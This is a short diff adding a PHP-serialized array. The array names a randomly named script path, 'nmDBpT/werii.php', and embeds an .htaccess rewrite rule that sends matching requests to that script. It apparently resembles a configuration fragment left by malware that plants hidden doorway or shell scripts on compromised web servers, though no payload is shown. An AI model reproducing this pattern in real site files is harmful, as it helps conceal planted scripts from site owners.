@@ -1,0 +1,4 @@
+a:4:{s:1:"p";s:16:"nmDBpT/werii.php";s:1:"c";s:4:"2436";s:1:"f";s:3:"./1";s:1:"h";s:92:"<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteRule ^werii.*$ werii.php [L]
+</IfModule>";}
